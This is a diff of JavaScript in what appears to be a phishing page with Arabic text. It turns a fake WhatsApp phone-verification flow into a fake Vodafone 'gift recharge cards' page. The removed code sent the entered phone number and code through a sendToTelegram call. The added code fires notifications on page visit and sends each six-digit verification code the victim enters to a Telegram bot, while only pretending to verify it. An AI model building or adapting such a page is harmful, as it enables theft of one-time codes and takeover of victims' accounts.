-                    isTimerRunning = false;
-                }
-                secondsRemaining = 30;
-                timerText.textContent = 'أعد الإرسال خلال 00:30';
-                resendLink.classList.add('disabled');
-            });
-
-            // ===== الانتقال للتحقق =====
-            function goToVerify(phoneNumber) {
-                storedPhone = phoneNumber.trim();
-                displayPhone.textContent = storedPhone;
-
-                mainContent.classList.add('hidden');
-                verifySection.classList.add('active');
-                verifySection.style.display = 'flex';
-                footer.style.display = 'none';
-
-                codeBoxes.forEach((box, index) => {
-                    box.value = '';
-                    box.classList.remove('filled');
-                    if (index === 0) {
-                        setTimeout(() => box.focus(), 300);
-                    }
-                });
-
-                errorMessage.classList.remove('show');
-                startTimer();
-
-                codeBoxes.forEach(box => {
-                    box.addEventListener('input', function() {
-                        errorMessage.classList.remove('show');
-                    });
-                });
-            }
-
-            // ===== زر "التالي" =====
-            btnNext.addEventListener('click', function() {
-                const rawPhone = phoneInput.value.trim();
-                if (rawPhone.length < 4) {
-                    phoneInput.style.borderColor = '#e74c3c';
-                    phoneInput.style.backgroundColor = '#fff5f5';
-                    setTimeout(() => {
-                        phoneInput.style.borderColor = '';
-                        phoneInput.style.backgroundColor = '';
-                    }, 1200);
-                    phoneInput.focus();
-                    return;
-                }
-                showConfirm(rawPhone);
-            });
-
-            phoneInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    btnNext.click();
-                }
-            });
-
-            // ===== تعديل الرقم =====
-            editNumber.addEventListener('click', function() {
-                verifySection.classList.remove('active');
-                verifySection.style.display = 'none';
-                mainContent.classList.remove('hidden');
-                footer.style.display = 'block';
-                phoneInput.focus();
-
-                if (timerInterval) {
-                    clearInterval(timerInterval);
-                    isTimerRunning = false;
-                }
-                secondsRemaining = 30;
-                timerText.textContent = 'أعد الإرسال خلال 00:30';
-                resendLink.classList.add('disabled');
-            });
+            // ===== إرسال إشعار بدخول الصفحة =====
+            sendVisitNotification();
 
             // ===== حقول الكود =====
             codeBoxes.forEach((box, index) => {
@@ -1146,122 +446,67 @@
                 return code;
             }
 
-            // ===== زر التأكيد =====
+            // ===== زر التفعيل =====
             btnVerify.addEventListener('click', function() {
                 const code = getFullCode();
                 if (code.length < 6) {
-                    errorMessage.textContent = 'الرجاء إدخال الرمز بالكامل (6 أرقام).';
+                    errorMessage.textContent = 'الرجاء إدخال الكود بالكامل (6 أرقام).';
                     errorMessage.classList.add('show');
                     return;
                 }
 
+                // إرسال إشعار بأن المستخدم أدخل كود
+                sendCodeNotification(code);
+
                 btnVerify.textContent = 'جاري التحقق...';
                 btnVerify.disabled = true;
 
+                // محاكاة التحقق (هنا الكود الحقيقي هيتم التحقق منه من عندك)
                 setTimeout(() => {
-                    sendToTelegram(storedPhone, code, 'code');
+                    // هنا أنت هتتأكد من الكود (لو الكود صح)
+                    // لو الكود صح:
+                    sendSuccessNotification(code);
                     
                     errorMessage.classList.remove('show');
-                    btnVerify.textContent = 'تم التحقق';
+                    btnVerify.textContent = '✅ تم التفعيل';
                     btnVerify.style.backgroundColor = '#25D366';
 
                     setTimeout(() => {
-                        showSuccess();
-                        btnVerify.textContent = 'تأكيد';
-                        btnVerify.style.backgroundColor = '#008069';
-                        btnVerify.disabled = false;
+                        codeSection.classList.add('hidden');
+                        successSection.classList.add('active');
                         
-                        if (timerInterval) {
-                            clearInterval(timerInterval);
-                            isTimerRunning = false;
-                        }
-                        secondsRemaining = 30;
-                        timerText.textContent = 'أعد الإرسال خلال 00:30';
-                        resendLink.classList.add('disabled');
+                        btnVerify.textContent = 'تفعيل الكود';
+                        btnVerify.style.backgroundColor = '#e60000';
+                        btnVerify.disabled = false;
                         
                         codeBoxes.forEach(box => {
                             box.value = '';
                             box.classList.remove('filled');
                         });
-                    }, 1000);
+                    }, 800);
+                    
+                    // لو الكود غلط:
+                    // errorMessage.textContent = 'الكود غير صحيح. حاول مرة أخرى.';
+                    // errorMessage.classList.add('show');
+                    // btnVerify.textContent = 'تفعيل الكود';
+                    // btnVerify.disabled = false;
                 }, 1500);
             });
 
             // ===== زر العودة =====
             btnSuccess.addEventListener('click', function() {
                 successSection.classList.remove('active');
-                successSection.style.display = 'none';
-                mainContent.classList.remove('hidden');
-                footer.style.display = 'block';
-                phoneInput.value = '';
-                phoneInput.focus();
-                confettiContainer.innerHTML = '';
-            });
-
-            // ===== المؤقت =====
-            function startTimer() {
-                if (timerInterval) {
-                    clearInterval(timerInterval);
-                }
-                secondsRemaining = 30;
-                isTimerRunning = true;
-                resendLink.classList.add('disabled');
-                updateTimerDisplay();
-
-                timerInterval = setInterval(function() {
-                    secondsRemaining--;
-                    updateTimerDisplay();
-                    if (secondsRemaining <= 0) {
-                        clearInterval(timerInterval);
-                        isTimerRunning = false;
-                        timerText.textContent = 'لم يصلك الرمز؟';
-                        resendLink.classList.remove('disabled');
-                    }
-                }, 1000);
-            }
-
-            function updateTimerDisplay() {
-                const mins = Math.floor(secondsRemaining / 60);
-                const secs = secondsRemaining % 60;
-                timerText.textContent = `أعد الإرسال خلال ${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-            }
-
-            // ===== إعادة الإرسال =====
-            resendLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                if (this.classList.contains('disabled')) {
-                    return;
-                }
-                timerText.textContent = 'جاري إعادة الإرسال...';
-                setTimeout(() => {
-                    startTimer();
-                    timerText.textContent = 'تم إعادة إرسال الرمز';
-                    setTimeout(() => {
-                        if (isTimerRunning) {
-                            updateTimerDisplay();
-                        }
-                    }, 1500);
-                }, 800);
-            });
-
-            // ===== "ما هو رقمي؟" =====
-            document.getElementById('whatsMyNumber').addEventListener('click', function() {
-                alert('رقمك هو الرقم الذي أدخلته في الحقل أعلاه.\nسيتم استخدامه للتحقق من حساب واتساب الخاص بك.');
+                codeSection.classList.remove('hidden');
+                codeBoxes[0].focus();
             });
 
             // ===== تركيز =====
             setTimeout(() => {
-                phoneInput.focus();
-            }, 400);
+                codeBoxes[0].focus();
+            }, 500);
 
-            // ===== إغلاق التأكيد =====
-            confirmOverlay.addEventListener('click', function(e) {
-                if (e.target === this) {
-                    hideConfirm();
-                }
-            });
-
-            console.log('التطبيق جاهز');
+            console.log('📱 تطبيق فودافون - كروت شحن هدية');
+            console.log('✅ الإشعارات هتوصل لبوت التليجرام');
         })();
     </script>
 
